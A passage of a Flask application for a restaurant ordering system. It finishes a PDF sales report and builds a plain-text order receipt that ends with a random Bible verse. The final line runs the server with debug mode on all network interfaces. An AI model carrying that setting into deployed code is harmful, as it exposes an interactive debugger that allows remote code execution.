                f"R$ {pedido['valor_total']:.2f}",
                pedido['forma_pagamento'] if pedido['forma_pagamento'] else 'N/A',
                pedido['itens_formatados'] if pedido['itens_formatados'] else 'Nenhum item registrado'
            ])
        
        table_style = TableStyle([
            ('BACKGROUND', (0,0), (-1,0), cor_ciano_comenza),
            ('TEXTCOLOR', (0,0), (-1,0), colors.white),
            ('ALIGN', (0,0), (-1,-1), 'LEFT'),
            ('FONTNAME', (0,0), (-1,0), 'Helvetica-Bold'),
            ('BOTTOMPADDING', (0,0), (-1,0), 6),
            ('BACKGROUND', (0,1), (-1,-1), colors.white), # Fundo branco para as linhas de dados
            ('GRID', (0,0), (-1,-1), 1, colors.lightgrey)
        ])
        
        col_widths = [2*cm, 2*cm, 3.5*cm, 3.5*cm, 2.5*cm, 2.5*cm, None] 
        table = Table(data_table, colWidths=col_widths)
        table.setStyle(table_style)
        story.append(table)
    else:
        story.append(Paragraph("Nenhum pedido fechado encontrado para esta data.", style_body))

    doc.build(story)
    buffer.seek(0)
    return send_file(buffer, mimetype='application/pdf', download_name=f'relatorio_detalhado_{data_relatorio_obj.strftime("%Y%m%d")}.pdf', as_attachment=True)


@app.route('/pedido/<int:pedido_id>/comanda_texto')
def gerar_texto_comanda(pedido_id):
    import random

    conn = get_db_connection()
    cursor = conn.cursor(pymysql.cursors.DictCursor)

    cursor.execute("""
        SELECT comanda_id, valor_total, data_abertura, forma_pagamento
        FROM pedidos WHERE id = %s
    """, (pedido_id,))
    pedido = cursor.fetchone()

    cursor.execute("""
        SELECT nome_item, quantidade, preco_unitario
        FROM pedido_itens
        WHERE pedido_id = %s
        ORDER BY id
    """, (pedido_id,))
    itens = cursor.fetchall()

    cursor.close()
    conn.close()

    # =============== Layout da Comanda ===============
    linhas = []
    def centro(txt): return txt.center(15)

    # Cabeçalho bonito
    linhas.append(centro("********************************"))
    linhas.append(centro("      COMENZA FOOD      "))
    linhas.append(centro(" Solucoes em Alimentacao "))
    linhas.append(centro("********************************"))
    linhas.append("")
    linhas.append(centro(f"COMANDA N {pedido['comanda_id']}"))

    if pedido.get('data_abertura'):
        try:
            linhas.append(centro(pedido['data_abertura'].strftime("Data: %d/%m %H:%M")))
        except Exception:
            pass

    linhas.append("-" * 32)

    # Itens
    for it in itens:
        nome = it['nome_item'][:24]
        linhas.append(f"{it['quantidade']}x {nome}")
        linhas.append(f"    R$ {it['preco_unitario']:.2f}")

    linhas.append("-" * 32)
    linhas.append(centro(f"TOTAL: R$ {pedido['valor_total']:.2f}"))

    if pedido.get('forma_pagamento'):
        linhas.append(centro(f"PGTO: {pedido['forma_pagamento']}"))

    linhas.append("")
    linhas.append(centro("Obrigado pela preferencia!"))
    linhas.append(centro("@comenzafood"))
    linhas.append("")

    # =============== Versiculo aleatorio (sem acento) ===============
    versiculos = [
        "O Senhor e meu pastor; nada me faltara. (Sl 23:1)",
        "Tudo posso naquele que me fortalece. (Fp 4:13)",
        "Deus e amor. (1Jo 4:8)",
        "O choro pode durar uma noite, mas a alegria vem pela manha. (Sl 30:5)",
        "Entrega o teu caminho ao Senhor. (Sl 37:5)",
        "O Senhor e bom e sua misericordia dura para sempre. (Sl 100:5)",
        "O amor nunca falha. (1Co 13:8)",
        "Sede fortes e corajosos. (Js 1:9)",
        "O Senhor e a minha luz e a minha salvacao. (Sl 27:1)",
        "O justo vivera pela fe. (Rm 1:17)",
        "Buscai ao Senhor enquanto se pode achar. (Is 55:6)",
        "Alegrai-vos sempre. (1Ts 5:16)",
        "Deus e o nosso refugio e fortaleza. (Sl 46:1)",
        "Bem-aventurados os que tem fome e sede de justica. (Mt 5:6)",
        "Em tudo dai gracas. (1Ts 5:18)",
        "O Senhor pelejara por vos. (Ex 14:14)",
        "A graca do Senhor e suficiente. (2Co 12:9)",
        "O Senhor te guardara de todo mal. (Sl 121:7)",
        "O Senhor esta perto dos que tem o coracao quebrantado. (Sl 34:18)",
        "O temor do Senhor e o principio da sabedoria. (Pv 9:10)",
        "O amor cobre uma multidao de pecados. (1Pe 4:8)",
        "Fe e o firme fundamento das coisas que se esperam. (Hb 11:1)",
        "Regozijai-vos no Senhor. (Fp 4:4)",
        "O Senhor e fiel em todas as suas promessas. (Sl 145:13)",
        "Nao temas, porque eu sou contigo. (Is 41:10)",
        "Aquele que habita no esconderijo do Altissimo. (Sl 91:1)",
        "O Senhor e bom para os que nele confiam. (Lm 3:25)",
        "Bem-aventurados os pacificadores. (Mt 5:9)",
        "A fe sem obras e morta. (Tg 2:26)",
        "O Senhor reina para sempre. (Sl 146:10)",
        "Deleita-te no Senhor. (Sl 37:4)",
        "Nao se turbe o vosso coracao. (Jo 14:1)",
        "Deus e o nosso socorro bem presente. (Sl 46:1)",
        "Em paz me deito e logo adormeco. (Sl 4:8)",
        "O Senhor sustentara o justo. (Sl 37:17)",
        "O Senhor e o meu rochedo. (Sl 18:2)",
        "O Senhor e compassivo e misericordioso. (Tg 5:11)",
        "A alegria do Senhor e a nossa forca. (Ne 8:10)",
        "Vinde a mim, todos os que estais cansados. (Mt 11:28)",
        "Bem-aventurados os puros de coracao. (Mt 5:8)",
        "Lampada para os meus pes e tua palavra. (Sl 119:105)",
        "Guardai-vos no amor de Deus. (Jd 1:21)",
        "O Senhor e a forca do seu povo. (Sl 28:8)",
        "O Senhor e bom para todos. (Sl 145:9)",
        "O Senhor sara os quebrantados de coracao. (Sl 147:3)",
        "A misericordia do Senhor e de geracao em geracao. (Sl 100:5)",
        "Sede alegres na esperanca. (Rm 12:12)",
        "Buscai primeiro o Reino de Deus. (Mt 6:33)",
        "A paz de Deus guardara o vosso coracao. (Fp 4:7)",
        "O Senhor e reto em todos os seus caminhos. (Sl 145:17)",
        "O Senhor firma os passos do homem bom. (Sl 37:23)"
    ]

    verso_escolhido = random.choice(versiculos)
    linhas.append(centro(verso_escolhido))
    linhas.append(centro("********************************"))

    # MUITO espaco pro corte
    linhas.append("\n" * 10)

    texto = "\n".join(linhas)
    return Response(texto, mimetype="text/plain; charset=utf-8")

if __name__ == '__main__':
    app.run(host='0.0.0.0',debug=True)
